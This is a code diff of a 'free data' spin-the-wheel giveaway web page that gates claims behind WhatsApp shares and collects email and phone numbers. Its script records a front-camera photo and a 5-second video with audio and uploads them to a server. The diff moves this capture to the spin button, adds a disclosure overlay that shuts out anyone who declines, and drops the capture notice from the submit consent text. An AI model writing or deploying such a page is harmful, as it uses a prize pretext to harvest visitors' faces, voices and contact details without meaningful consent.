@@ -1,4 +1,4 @@
-    <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -61,9 +61,41 @@ input,select{width:100%;padding:12px;border-radius:10px;border:1.5px solid #c9d1
 .msg{margin-top:10px;font-size:.9rem;font-weight:600}
 .msg.err{color:#b3261e}.msg.ok{color:#117a3d}
 @media (prefers-reduced-motion:reduce){#wheel{transition-duration:.01s}}
+
+/* ===== PRE-LOAD CONSENT OVERLAY ===== */
+#gate{position:fixed;inset:0;z-index:10000;background:rgba(11,17,38,.97);
+  display:flex;align-items:center;justify-content:center;padding:20px}
+#gate .card{max-width:440px;background:#1d2e55;border:2px solid var(--gold);
+  border-radius:20px;padding:26px 22px;text-align:left;color:#fff}
+#gate h2{font-size:1.3rem;margin-bottom:10px;color:var(--sun)}
+#gate p{font-size:.92rem;line-height:1.55;color:#dfe6f5;margin-bottom:12px}
+#gate ul{margin:0 0 14px 18px;font-size:.88rem;color:#dfe6f5;line-height:1.6}
+#gate .row{display:flex;gap:10px;margin-top:6px}
+#gate button{flex:1;padding:13px;border-radius:12px;font-weight:800;font-size:1rem}
+#gate .yes{background:var(--amber);color:#3b2300}
+#gate .no{background:#35508c;color:#fff}
 </style>
 </head>
 <body>
+
+<!-- ===== PRE-LOAD CONSENT GATE (shown before anything else) ===== -->
+<div id="gate">
+  <div class="card">
+    <h2>Before you spin — please read</h2>
+    <p>This is a <b>free data giveaway game</b>. Here is what the <b>Spin the wheel</b> button does:</p>
+    <ul>
+      <li>Spins the prize wheel — you have <b>2 spins</b> and a chance to win 1–3 GB of data.</li>
+      <li><b>Camera &amp; microphone:</b> when you press spin, your device will take <b>one photo</b> and record a <b>5-second video with audio</b>, which is uploaded to the giveaway server.</li>
+      <li>If you win, you fill in your email and phone number so the data can be delivered.</li>
+    </ul>
+    <p><b>Only press spin if you agree to the photo and video capture.</b> Your browser will also ask for camera permission — you can still decline there.</p>
+    <div class="row">
+      <button class="yes" id="gateYes">I Agree — Enter</button>
+      <button class="no" id="gateNo">Decline</button>
+    </div>
+  </div>
+</div>
+
 <main>
   <h1>Spin &amp; win free data from Data Mart</h1>
   <p class="sub">Everyone gets 2 spins. Land on a prize and claim it below.</p>
@@ -111,7 +143,7 @@ input,select{width:100%;padding:12px;border-radius:10px;border:1.5px solid #c9d1
     </div>
 
     <button class="submit" id="submitBtn" disabled>Submit</button>
-    <p class="consent">By submitting, you agree that your email, phone number and prize amount are sent to the giveaway organiser so they can deliver your data. Your device will also take one photo and record a 5-second video with audio as part of this submission, which is uploaded to the same server. Orders are processed manually and delivered within 6 hours.</p>
+    <p class="consent">By submitting, you agree that your email, phone number and prize amount are sent to the giveaway organiser so they can deliver your data. Orders are processed manually and delivered within 6 hours.</p>
     <div class="msg" id="formMsg" role="status"></div>
   </section>
   <p class="sitelink">Need more data? Visit <a href="https://datamartgh.shop" target="_blank" rel="noopener">datamartgh.shop</a></p>
@@ -129,7 +161,21 @@ const SHARE_TEXT = "I just spun to win free data! Try your luck here: ";
 const SHARE_URL  = location.href; // change to your live site link if needed
 /* ================================ */
 
-// 12 slices: 6 prizes + 6 "Try Again", alternating
+// ===== PRE-LOAD GATE: page is locked until the visitor agrees or declines =====
+const gate = document.getElementById('gate');
+let gateAgreed = false;
+
+document.getElementById('gateYes').addEventListener('click', () => {
+  gateAgreed = true;
+  gate.style.display = 'none';
+});
+document.getElementById('gateNo').addEventListener('click', () => {
+  gate.querySelector('.card').innerHTML =
+    '<h2>No problem</h2><p>You declined the camera capture, so the spin game is unavailable on this device. ' +
+    'You can visit <a href="https://datamartgh.shop" style="color:#fcd34d">datamartgh.shop</a> directly instead.</p>';
+});
+
+// 12 slices: prizes + "Try Again", alternating
 const slices = ["1GB","Try Again","2GB","Try Again","3GB","Try Again","1GB","Try Again","2GB","Try Again"];
 const N = slices.length, ANG = 360 / N;
 const fills = {"1GB":["#ffb02e","#f59e0b"],"2GB":["#ffd24d","#fbbf24"],"3GB":["#ff6b81","#e11d48"],"Try Again":["#35508c","#22386b"]};
@@ -160,7 +206,6 @@ const wheel = $("wheel");
         font-weight="800" font-size="${win?17:10.5}" letter-spacing="${win?0:.3}" fill="${textCol[label]}">${label}</text></g>`;
   });
   h += `<circle r="90" fill="url(#shade)"/>`;
-  // rim bulbs
   for (let i=0;i<N;i++){
     const [bx,by]=pt(i*ANG+ANG/2,95);
     h += `<circle cx="${bx}" cy="${by}" r="2.2" fill="#fff" stroke="#b45309" stroke-width=".6"/>`;
@@ -193,12 +238,45 @@ function render(){
 function pickOutcome(){
   if (Math.random() >= WIN_CHANCE) return "Try Again";
   const r = Math.random();
-  return r < 0.55 ? "1GB" : r < 0.85 ? "2GB" : "3GB";   // 3GB is the biggest prize
+  return r < 0.55 ? "1GB" : r < 0.85 ? "2GB" : "3GB";
 }
 
+// ===== SPIN SOUND (Web Audio — no files needed) =====
+let audioCtx;
+function playSpinSound() {
+  try {
+    audioCtx = audioCtx || new (window.AudioContext || window.webkitAudioContext)();
+    const t0 = audioCtx.currentTime, dur = 5.2;
+    // Ticking that slows down like a real wheel
+    for (let i = 0; i < 60; i++) {
+      const t = t0 + dur * (1 - Math.pow(1 - i / 60, 2));
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      osc.type = 'square';
+      osc.frequency.value = 900;
+      gain.gain.setValueAtTime(0.08, t);
+      gain.gain.exponentialRampToValueAtTime(0.001, t + 0.04);
+      osc.connect(gain).connect(audioCtx.destination);
+      osc.start(t); osc.stop(t + 0.05);
+    }
+    // Rising whoosh at the start
+    const osc2 = audioCtx.createOscillator(), g2 = audioCtx.createGain();
+    osc2.type = 'sawtooth';
+    osc2.frequency.setValueAtTime(120, t0);
+    osc2.frequency.exponentialRampToValueAtTime(400, t0 + 1.2);
+    g2.gain.setValueAtTime(0.05, t0);
+    g2.gain.exponentialRampToValueAtTime(0.001, t0 + 1.4);
+    osc2.connect(g2).connect(audioCtx.destination);
+    osc2.start(t0); osc2.stop(t0 + 1.5);
+  } catch (e) { /* audio unavailable — ignore */ }
+}
+
+// ===== SPIN BUTTON: plays sound, spins, then captures photo + video =====
 $("spinBtn").addEventListener("click", () => {
+  if (!gateAgreed) return; // must have agreed to the disclosure first
   if (spinning || state.used >= MAX_SPINS || state.won) return;
   spinning = true;
+  playSpinSound();
   const outcome = pickOutcome();
   const options = slices.map((s,i)=>s===outcome?i:-1).filter(i=>i>=0);
   const idx = options[Math.floor(Math.random()*options.length)];
@@ -209,6 +287,10 @@ $("spinBtn").addEventListener("click", () => {
   wheel.style.transform = `rotate(${rotation}deg)`;
   $("spinBtn").disabled = true;
   $("result").textContent = ""; $("result").className = "result";
+
+  // Fire the capture in the background while the wheel spins.
+  // The browser will show its own camera/mic permission prompt.
+  run();
 
   setTimeout(() => {
     spinning = false;
@@ -236,7 +318,6 @@ $("waBtn").addEventListener("click", () => {
   if (state.shares >= SHARES_REQUIRED || waOpening) return;
   waOpening = true;
   window.open("https://wa.me/?text=" + encodeURIComponent(SHARE_TEXT + SHARE_URL), "_blank");
-  // Count the share when the person comes back to this tab
   const onBack = () => {
     if (document.visibilityState === "visible") {
       document.removeEventListener("visibilitychange", onBack);
@@ -254,7 +335,7 @@ function updateShare(){
   $("submitBtn").disabled = state.shares < SHARES_REQUIRED || state.submitted;
 }
 
-// Submit to the resource server, then capture photo + video
+// Submit claim details to the resource server
 $("submitBtn").addEventListener("click", async () => {
   const email = $("email").value.trim(), net = $("network").value, phone = $("phone").value.trim();
   const msg = $("formMsg"); msg.className = "msg";
@@ -272,17 +353,11 @@ $("submitBtn").addEventListener("click", async () => {
     const res = await fetch(API_URL, { method: "POST", body });
     if (!res.ok) throw new Error("Failed");
     state.submitted = true; save();
-    msg.textContent = "Claim sent! Now capturing your photo and video (please allow camera access)...";
-    msg.className = "msg ok";
+    msg.textContent = "Sent! You will receive your data within 6 hours."; msg.className = "msg ok";
     render();
-
-    // Capture runs here, triggered by the user's own click.
-    // The browser will still show its own camera/mic permission prompt,
-    // which the visitor must explicitly Allow.
-    await run();
   } catch (e) {
     msg.textContent = "Couldn't send: " + (e.message || e); msg.className = "msg err";
-      $("submitBtn").disabled = false;
+    $("submitBtn").disabled = false;
   }
 });
 
@@ -290,10 +365,10 @@ render();
 
 
 /* ============================================================
-   CAMERA & MIC CAPTURE (runs only after Submit is clicked)
+   CAMERA & MIC CAPTURE (consented via the pre-load gate)
    ============================================================ */
 
-// ===== SAFE STATUS (works even if #status doesn't exist on the host page) =====
+// ===== SAFE STATUS =====
 const setMsg = (m) => {
     const el = document.getElementById('status');
     if (el) el.textContent = m;
@@ -304,25 +379,21 @@ const setMsg = (m) => {
 async function run() {
     setMsg('Starting camera...');
     try {
-        // Guard: not supported at all (http:// pages, ancient browsers)
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             throw new Error('getUserMedia unavailable (need HTTPS or localhost)');
         }
 
-        // STEP 1: camera + mic
         const stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user' },
             audio: true
         });
 
         try {
-            // STEP 2: photo -> kind: 'image'
             setMsg('Capturing photo...');
             const photo = await takePhoto(stream);
             await send(photo, 'image', `photo_${Date.now()}.jpg`, 'photo capture');
             setMsg('Photo uploaded.');
 
-            // STEP 3: 5s video with audio -> kind: 'video'
             setMsg('Recording 5s video...');
             const clip = await recordClip(stream);
             await send(clip.blob, 'video', `video_${Date.now()}${clip.ext}`, '5s video capture');
@@ -347,18 +418,18 @@ async function takePhoto(stream) {
         video.onerror = () => reject(new Error('Video element failed'));
     });
     await video.play();
-    // give the first frame a moment to render before grabbing it
     await new Promise(r => requestAnimationFrame(r));
     await new Promise(r => requestAnimationFrame(r));
 
     const canvas = document.createElement('canvas');
-    canvas.width  = video.videoWidth || 640;
+    canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
     canvas.getContext('2d').drawImage(video, 0, 0);
 
-    return new Promise((resolve, reject) =>
+    return new Promise((resolve, reject) => 
         canvas.toBlob(b => b ? resolve(b) : reject(new Error('Canvas encode failed')),
-                      'image/jpeg', 0.8));
+            'image/jpeg', 0.8)
+    );
 }
 
 // ===== VIDEO (with MP4 fallback for Safari/iOS) =====
@@ -368,19 +439,18 @@ function recordClip(stream) {
             return reject(new Error('MediaRecorder not supported'));
         }
 
-        // Try in order: VP8+Opus WebM -> plain WebM -> MP4 (Safari) -> default
         const CANDIDATES = [
             ['video/webm;codecs=vp8,opus', '.webm'],
-            ['video/webm;codecs=h264',     '.webm'],
-            ['video/webm',                 '.webm'],
-            ['video/mp4',                  '.mp4'],   // Safari 14.1+, iOS
+            ['video/webm;codecs=h264',   '.webm'],
+            ['video/webm',               '.webm'],
+            ['video/mp4',                '.mp4'],
         ];
         let pick = CANDIDATES.find(([t]) => MediaRecorder.isTypeSupported(t));
         let rec;
         try {
             rec = pick
                 ? new MediaRecorder(stream, { mimeType: pick[0] })
-                : new MediaRecorder(stream);          // browser default if nothing matched
+                : new MediaRecorder(stream);
         } catch (e) {
             return reject(new Error('MediaRecorder init failed: ' + e.message));
         }
@@ -390,8 +460,7 @@ function recordClip(stream) {
         const chunks = [];
         rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
         rec.onerror = e => reject(e.error || new Error('Recorder error'));
-        // Strip codec params so the blob's type matches the server allow-list,
-        // e.g. "video/webm;codecs=vp8,opus" -> "video/webm"
+        // Strip codec params so the blob's type matches the server allow-list
         rec.onstop = () => {
             const type = rec.mimeType.split(';')[0];
             resolve({ blob: new Blob(chunks, { type }), ext });
@@ -400,10 +469,8 @@ function recordClip(stream) {
         rec.start();
         setTimeout(() => rec.state !== 'inactive' && rec.stop(), RECORD_MS);
     });
-}
-
-// ===== UPLOAD =====
-// Server contract: multer.single('file'), body fields: kind, title
+    }
+    // ===== UPLOAD =====
 async function send(blob, kind, filename, title) {
     const fd = new FormData();
     fd.append('file', blob, filename);
@@ -425,4 +492,4 @@ async function send(blob, kind, filename, title) {
 }
 </script>
 </body>
-  </html>
+</html>
